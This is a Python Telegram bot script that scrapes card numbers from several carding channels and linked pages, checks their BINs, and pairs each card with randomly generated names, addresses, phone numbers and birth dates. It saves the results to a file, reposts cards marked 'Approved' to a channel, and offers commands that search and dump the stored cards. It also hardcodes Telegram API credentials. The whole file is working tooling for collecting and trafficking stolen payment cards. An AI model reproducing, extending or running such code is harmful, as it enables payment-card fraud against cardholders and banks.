import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
from random_address import real_random_address
import names
from datetime import datetime
import random
from time import sleep


from defs import getUrl, getcards, phone
API_ID =  20597671
API_HASH = 'e89f2c4056dd402bef8299bce660cbcd'
SEND_CHAT = '@Scrapperleonbinner'

client = TelegramClient('session', API_ID, API_HASH)
ccs = []

chats  = [
    # '@fullcuentasgratis','
    '@qkkkkkkpeluax'                                                '@CHKBINS',                                                     '@LigthStormChat',                                                          '@cardesclub'   
]

with open('cards.txt', 'r') as r:
    temp_cards = r.read().splitlines()


for x in temp_cards:
    car = getcards(x)
    if car:
        ccs.append(car[0])
    else:
        continue

@client.on(events.NewMessage(chats=chats, func = lambda x: getattr(x, 'text')))
async def my_event_handler(m):
    if m.reply_markup:
        text = m.reply_markup.stringify()
        urls = getUrl(text)
        if not urls:
            return
        text = requests.get(urls[0]).text
    else:
        text = m.text
    cards = getcards(text)
    if not cards:
        return
    cc,mes,ano,cvv = cards
    if cc in ccs:
        return
    ccs.append(cc)
    extra = cc[0:0+12]
    bin = requests.get(f'https://lookup.binlist.net/{cc[:6]}')
    if not bin:
        return
    bin_json =  bin.json()
    addr = real_random_address()
    fullinfo = f"{cc}|{mes}|{ano}|{cvv}|{names.get_full_name()}|{addr['address1']}|{addr['city']}|{addr['state']}|{addr['postalCode']}|{phone()}|dob: {datetime.strftime(datetime(random.randint(1960, 2005), random.randint(1, 12),random.randint(1, 28), ), '%Y-%m-%d')}|United States Of America"
    text = f"""
━━━━━━ ❴🇨🇴❵ ━━━━━━
   🌱 𝑴𝑨𝑭𝑰𝑨 𝑺𝑪𝑹𝑨𝑷𝑷𝑬𝑹 🌱
━━━━━━ ❴🇨🇴❵ ━━━━━━
[●] Card ✅: `{cc}|{mes}|{ano}|{cvv}`
[●] Status ➪ Approved! ✅
━━━━[INFORMATION]━━━━

- ☘ `{bin_json['scheme']} - {bin_json['type']} - {bin_json['brand']}`
- ❄️ `{bin_json['bank']['name']}`
- 🏙 `{bin_json['country']['name']} - {bin_json['country']['emoji']}`

━━━━━━ ❴🇨🇴❵ ━━━━━━
- [●] 𝗘𝘅𝘁𝗿𝗮 : `{extra}xxxx|{mes}|{ano}|rnd`
- [●] 𝙊𝙬𝙣𝙚𝙧 : @NicolasRiosYTT
━━━━━━ ❴🇨🇴❵ ━━━━━━
"""    
    print(f'{cc}|{mes}|{ano}|{cvv}')
    with open('cards.txt', 'a') as w:
        w.write(fullinfo + '\n')
    await client.send_message(SEND_CHAT, text, file = 'nico.jpg')



@client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'[./!]extrap( (.*))')))
async def my_event_handler(m):
    text = m.pattern_match.group(1).strip()
    with open('cards.txt', 'r') as r:
        cards = r.read().splitlines() # list of cards
    if not cards:
        return await m.reply("Not Found")
    r = re.compile(f"{text}*.")
    if not r:
        return await m.reply("Not Found")
    newlist = list(filter(r.match, cards)) # Read Note below
    if not newlist:
        return await m.reply("Not Found")
    if len(newlist) == 0:
        return await m.reply("0 Cards found")
    cards = "\n".join(newlist)
    return await m.reply(cards)


@client.on(events.NewMessage(outgoing = True, pattern = re.compile(r'.lives')))
async def my_event_handler(m):
    # emt = await client.get_entity(1582775844)
    # print(telethon.utils.get_input_channel(emt))
    # print(telethon.utils.resolve_id(emt))
    await m.reply(file = 'cards.txt')



client.start()
client.run_until_disconnected()
